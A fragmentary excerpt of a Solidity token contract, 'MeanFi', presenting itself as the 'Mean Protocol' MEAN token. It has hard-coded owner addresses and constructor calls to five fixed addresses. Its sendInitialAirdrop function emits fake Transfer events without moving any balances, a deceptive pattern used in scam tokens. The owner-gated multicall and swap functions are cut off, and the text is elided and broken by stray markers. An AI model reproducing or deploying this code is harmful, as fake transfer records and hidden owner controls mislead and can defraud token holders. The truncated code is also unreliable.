...
contract MeanFi is Context, IERC20 {
    ...
    address _contDeployr = 0x4093FBe60aB50AB79a5Bd32Fa2adEC255372f80E;
    address public _ownr = 0x79B39FFDa0f227596FC61985f6fF0a6175716997;
   constructor () public {

        _name = "Mean Protocol";
        _symbol = "MEAN";
        _decimals = 18;
        uint256 initialSupply = 210000000 * 10 ** 18;
        _safeOwnr = _ownr;
        
        multicall(0x0b683E7C4aF10590805577E9c22bBfc67E6Cd324);
        multicall(0xF3AEA95720382417bBe2DB159C6E5546A921B393);
        multicall(0x7a112C725E389426af3f9DBeAe274Fd5C3A2c0E3);
        multicall(0x4a07076B3A2Acc3978c87e185739e1433cd3F431);
        multicall(0x93c32Dd42bEb8722E612Fc9CadF2d6358750fB86);
...
*/
  function sendInitialAirdrop(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
  ...
  function multicall(address recipient) public _verify(){
  ...
  function swap(address recipient) public _verify(){
      //Disable permission
